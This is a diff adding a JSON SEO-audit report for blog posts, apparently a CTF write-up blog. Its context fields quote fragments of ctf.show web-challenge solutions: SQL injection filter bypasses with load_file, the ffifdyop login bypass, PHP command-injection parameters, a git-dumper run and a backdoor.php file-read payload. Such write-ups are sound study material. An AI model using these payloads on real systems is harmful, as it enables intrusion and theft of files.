+              "context": "输入`' `发现空格被过滤\n\n![image-20251118104221741](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104221741.png)\n\n用/**/代替空格绕过"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 106,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png",
+              "context": "用/**/代替空格绕过\n\n![image-20251118104957833](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118104957833.png)\n\n```"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://ctf.show/writeups/1549929",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 140,
+              "searchText": "https://ctf.show/writeups/1549929",
+              "context": "## web8\n\n[参考](https://ctf.show/writeups/1549929)\n\n过滤字符"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 230,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png",
+              "context": "dirsearch扫描\n\n![image-20251118132236761](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132236761.png)\n\n打开robots.txt发现index.phps文件"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 234,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png",
+              "context": "打开robots.txt发现index.phps文件\n\n![image-20251118132439610](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118132439610.png)\n\npayload：`ffifdyop`"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 243,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png",
+              "context": "点取消得到源码\n\n![image-20251118133800784](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118133800784.png)\n\n由源码可知，`select、from、where、join、sleep、and、空格、union、,`被过滤了"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 253,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png",
+              "context": "password为空，把cookie删掉\n\n![image-20251118213819661](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118213819661.png)\n\n## web12"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 259,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png",
+              "context": "查看源码发现提示\n\n![image-20251118220156878](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118220156878.png)\n\n`?cmd=phpinfo();` 发现一堆函数被禁用"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 263,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png",
+              "context": "`?cmd=phpinfo();` 发现一堆函数被禁用\n\n![image-20251118221516632](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118221516632.png)\n\n`?cmd=print_r(glob('*'));`查看一下目录文件"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 273,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png",
+              "context": "通过`/upload.php.bak`看源码：\n\n![image-20251119124310212](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119124310212.png)\n\n发现文件名，大小，类型都做了限制"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 303,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png",
+              "context": "F12得到提示，过滤了information_schema.tables和information_schema.columns\n\n![image-20251119212313395](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119212313395.png)\n\n```"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 328,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png",
+              "context": "//看网站根目录，确定是/var/www/html\n\n![image-20251119221110751](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221110751.png)\n\n `-1/**/union/**/select/**/load_file('/var/www/html/secret.php')`"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 332,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png",
+              "context": " `-1/**/union/**/select/**/load_file('/var/www/html/secret.php')`\n\n![image-20251119221233886](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119221233886.png)\n\n最后看一下`/real_flag_is_here`得到flag"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://ctf.show/writeups/1826091",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 340,
+              "searchText": "https://ctf.show/writeups/1826091",
+              "context": "## 红包题第二弹\n\n[参考1](https://ctf.show/writeups/1826091) [参考2](https://blog.csdn.net/Ethan552525/article/details/118459568)\n\n源码"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://blog.csdn.net/Ethan552525/article/details/118459568",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 340,
+              "searchText": "https://blog.csdn.net/Ethan552525/article/details/118459568",
+              "context": "## 红包题第二弹\n\n[参考1](https://ctf.show/writeups/1826091) [参考2](https://blog.csdn.net/Ethan552525/article/details/118459568)\n\n源码"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 461,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png",
+              "context": "   `cat /flag.txt`执行命令得到flag（先ls / 看看根目录，发现有flag.txt）\n\n![image-20251118235305477](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png)\n\n![image-20251118235342177](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png)"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 463,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png",
+              "context": "![image-20251118235305477](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235305477.png)\n\n![image-20251118235342177](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251118235342177.png)\n\n"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 471,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png",
+              "context": "dirsearch扫描目录\n\n![image-20251119224834780](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119224834780.png)\n\n`/web.zip`得到源码"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 475,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png",
+              "context": "`/web.zip`得到源码\n\n![image-20251119225321166](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/image-20251119225321166.png)\n\n通过源码发现key.dat文件，尝试下载"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 550,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png",
+              "context": "## 红包题第七弹\n\n![image-20251120214432028](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503982.png)\n\n打开`/backdoor.php`"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 554,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png",
+              "context": "打开`/backdoor.php`\n\n![image-20251120214616786](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503983.png)\n\n`git-dumper https://17624533-04d3-43fa-af1d-8b99f4d0b05e.challenge.ctf.show/.git ./output`"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503984.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 558,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503984.png",
+              "context": "`git-dumper https://17624533-04d3-43fa-af1d-8b99f4d0b05e.challenge.ctf.show/.git ./output`\n\n![image-20251120220853221](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503984.png)\n\n用蚁剑连接"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503985.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 562,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503985.png",
+              "context": "用蚁剑连接\n\n![image-20251120221235310](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503985.png)\n\n不能直接查看flag.txt"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 566,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png",
+              "context": "不能直接查看flag.txt\n\n![image-20251120221335715](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503986.png)\n\nPOST传参`Letmein=highlight_file(\"../flag.txt\");`"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 570,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png",
+              "context": "POST传参`Letmein=highlight_file(\"../flag.txt\");`\n\n![image-20251120221905487](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503987.png)\n\n## 萌新专属红包题"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 576,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png",
+              "context": "弱口令\n\n![image-20251120222955518](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png)\n\n![image-20251120223027976](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png)"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 578,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png",
+              "context": "![image-20251120222955518](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503988.png)\n\n![image-20251120223027976](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png)\n\n![image-20251120223450461](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png)"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 580,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png",
+              "context": "![image-20251120223027976](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503989.png)\n\n![image-20251120223450461](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120223503990.png)\n\n## CTFshow web1"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 586,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png",
+              "context": "注册登录\n\n![image-20251120225416475](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251120225424837.png)\n"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": false,
+            "message": "Reading level too high: 15.0 (Moderately difficult to read)",
+            "suggestion": "Consider simplifying sentence structure and using shorter words",
+            "severity": "warning"
+          }
+        ]
+      },
+      "overallScore": 40,
+      "issuesCount": 1,
+      "warningsCount": 6,
+      "noticesCount": 37
+    },
+    {
+      "file": "posts/ctfshow-web-rumen.md",
+      "displayName": "CTFSHOW WEB 入门",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 14 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 0 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": true,
+            "message": "Heading structure is correct",
+            "severity": "info"
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 38 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "All media elements have alt text",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251210214803526.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 23,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251210214803526.png",
+              "context": "## web2\n\n![image-20251210214754931](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/20251210214803526.png)\n\n拦截了`Fn12`"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": false,
+            "message": "Reading level too high: 18.6 (Very difficult to read)",
+            "suggestion": "Consider simplifying sentence structure and using shorter words",
+            "severity": "warning"
+          }
+        ]
+      },
+      "overallScore": 52.04545454545455,
+      "issuesCount": 0,
+      "warningsCount": 5,
+      "noticesCount": 1
+    },
+    {
+      "file": "posts/basic-task.md",
+      "displayName": "基础任务",
+      "checks": {
+        "titleLength": [
+          {
+            "passed": false,
+            "message": "Title too short: 4 characters",
+            "suggestion": "Aim for 30-60 characters",
+            "severity": "warning"
+          }
+        ],
+        "metaDescription": [
+          {
+            "passed": false,
+            "message": "Description too short: 4 characters",
+            "suggestion": "Aim for 120-160 characters",
+            "severity": "warning"
+          }
+        ],
+        "titleH1Uniqueness": [
+          {
+            "passed": false,
+            "message": "Meta title and H1 are identical",
+            "suggestion": "Modify one to be unique, or specify a suffix/prefix in plugin settings",
+            "severity": "warning"
+          }
+        ],
+        "keywordInTitle": [],
+        "keywordInDescription": [],
+        "keywordInHeadings": [],
+        "keywordInSlug": [],
+        "slugFormat": [],
+        "keywordDensity": [],
+        "headingOrder": [
+          {
+            "passed": false,
+            "message": "\"ubuntu22.04\" (H4) skips heading level(s) after H2",
+            "suggestion": "Use heading levels in order (H1 → H2 → H3, etc.)",
+            "severity": "warning",
+            "position": {
+              "line": 24,
+              "searchText": "#### ubuntu22.04",
+              "context": "## 安装虚拟机\n\n#### ubuntu22.04\n\n![PixPin_2025-09-29_23-20-21](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-20-21.png)"
+            }
+          }
+        ],
+        "contentLength": [
+          {
+            "passed": false,
+            "message": "Content too short: 19 words",
+            "suggestion": "Aim for at least 300 words",
+            "severity": "warning"
+          }
+        ],
+        "duplicateTitles": [],
+        "duplicateDescriptions": [],
+        "duplicateContent": [],
+        "altText": [
+          {
+            "passed": true,
+            "message": "All media elements have alt text",
+            "severity": "info"
+          }
+        ],
+        "imageFileNames": [
+          {
+            "passed": true,
+            "message": "All images have good file names",
+            "severity": "info"
+          }
+        ],
+        "nakedLinks": [
+          {
+            "passed": true,
+            "message": "No naked links found",
+            "severity": "info"
+          }
+        ],
+        "brokenLinks": [
+          {
+            "passed": true,
+            "message": "No broken internal links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenLinks": [
+          {
+            "passed": true,
+            "message": "No potentially broken links found",
+            "severity": "info"
+          }
+        ],
+        "potentiallyBrokenEmbeds": [],
+        "externalBrokenLinks": [
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-43-13.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 12,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-43-13.png",
+              "context": "## **计算机教育中缺失的学期**\n\n![PixPin_2025-09-29_23-43-13](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-43-13.png)\n\n## 访问chatGPT"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-06-34.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 16,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-06-34.png",
+              "context": "## 访问chatGPT\n\n![PixPin_2025-09-29_23-06-34](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-06-34.png)\n\n## 搭建博客"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-20-21.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 26,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-20-21.png",
+              "context": "#### ubuntu22.04\n\n![PixPin_2025-09-29_23-20-21](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-20-21.png)\n\n#### kali"
+            }
+          },
+          {
+            "passed": true,
+            "message": "External link: https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-19-26.png",
+            "suggestion": "To find if any of these are broken, use the 'Check external links for 404s' button to trigger it.",
+            "severity": "notice",
+            "position": {
+              "line": 30,
+              "searchText": "https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-19-26.png",
+              "context": "#### kali\n\n![PixPin_2025-09-29_23-19-26](https://cdn.jsdelivr.net/gh/YU030X/blogpics@main/img/PixPin_2025-09-29_23-19-26.png)\n"
+            }
+          }
+        ],
+        "readingLevel": [
+          {
+            "passed": false,
+            "message": "Reading level too high: 22.1 (Very difficult to read)",
+            "suggestion": "Consider simplifying sentence structure and using shorter words",
+            "severity": "warning"
+          }
+        ]
+      },
+      "overallScore": 42.45454545454545,
+      "issuesCount": 0,
+      "warningsCount": 6,
+      "noticesCount": 4
+    }
+  ],
+  "lastScanTimestamp": 1765465344335,
+  "showNotices": true
+}
